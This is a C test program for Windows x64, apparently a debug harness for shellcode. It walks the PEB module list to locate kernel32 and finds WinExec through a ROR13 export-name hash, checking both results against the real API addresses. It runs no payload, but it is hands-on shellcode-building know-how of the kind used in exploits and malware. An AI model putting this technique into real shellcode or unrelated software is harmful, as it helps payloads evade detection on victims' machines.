#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);

/* Inline PEB walk exactly matching our shellcode logic */
int main() {
    printf("[SHELL-DEBUG] Testing shellcode PEB walk logic\n\n");

    /* Replicate shellcode PEB walk in C */
    PVOID peb = (PVOID)__readgsqword(0x60);

    printf("[C] PEB at: %p\n", peb);

    PVOID ldr = *(PVOID*)((BYTE*)peb + 0x18);
    printf("[C] Ldr at: %p\n", ldr);

    PVOID head = *(PVOID*)((BYTE*)ldr + 0x20);
    printf("[C] InMemoryOrderModuleList head: %p\n", head);

    /* Walk flinks */
    PVOID e0 = *(PVOID*)head;
    PVOID e1 = *(PVOID*)e0;
    PVOID e2 = *(PVOID*)e1;

    printf("[C] Flink[0] (EXE entry)     : %p\n", e0);
    printf("[C] Flink[1] (ntdll entry)   : %p\n", e1);
    printf("[C] Flink[2] (kernel32 entry): %p\n", e2);

    /* DllBase is at offset 0x20 from InMemoryOrderLinks */
    PVOID k32_base = *(PVOID*)((BYTE*)e2 + 0x20);
    printf("[C] kernel32 base from walk  : %p\n", k32_base);

    /* Compare with GetModuleHandle */
    HMODULE k32_real = GetModuleHandleA("kernel32.dll");
    printf("[C] kernel32 base real       : %p\n", k32_real);

    if (k32_base == k32_real) {
        printf("[C] MATCH - PEB walk correct\n\n");

        /* Now test hash-based export search */
        /* Find WinExec with ROR13 hash 0x0E8AFE98 */
        BYTE* base = (BYTE*)k32_base;
        DWORD pe_off = *(DWORD*)(base + 0x3C);
        DWORD exp_rva = *(DWORD*)(base + pe_off + 0x88);
        BYTE* exp_dir = base + exp_rva;

        DWORD num_names = *(DWORD*)(exp_dir + 0x18);
        DWORD* names    = (DWORD*)(base + *(DWORD*)(exp_dir + 0x20));
        WORD*  ords     = (WORD*) (base + *(DWORD*)(exp_dir + 0x24));
        DWORD* funcs    = (DWORD*)(base + *(DWORD*)(exp_dir + 0x1C));

        printf("[C] Searching %lu exports for WinExec (hash=0x0E8AFE98)\n", num_names);

        for (DWORD i = 0; i < num_names; i++) {
            char* name = (char*)(base + names[i]);

            /* ROR13 hash */
            DWORD h = 0;
            for (char* p = name; *p; p++) {
                h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF;
                h = (h + (BYTE)*p) & 0xFFFFFFFF;
            }

            if (h == 0x0E8AFE98) {
                DWORD func_rva = funcs[ords[i]];
                PVOID func_va  = base + func_rva;
                printf("[C] FOUND WinExec: %s hash=0x%08X VA=%p\n",
                    name, h, func_va);

                /* Verify against GetProcAddress */
                PVOID real = GetProcAddress(k32_real, "WinExec");
                printf("[C] WinExec real VA: %p\n", real);

                if (func_va == real)
                    printf("[C] Hash search CORRECT\n");
                else
                    printf("[C] Hash search WRONG\n");
                break;
            }
        }
    } else {
        printf("[C] MISMATCH - PEB walk returns wrong base\n");
        printf("[C] Shellcode needs fixing\n");
    }

    getchar();
    return 0;
}
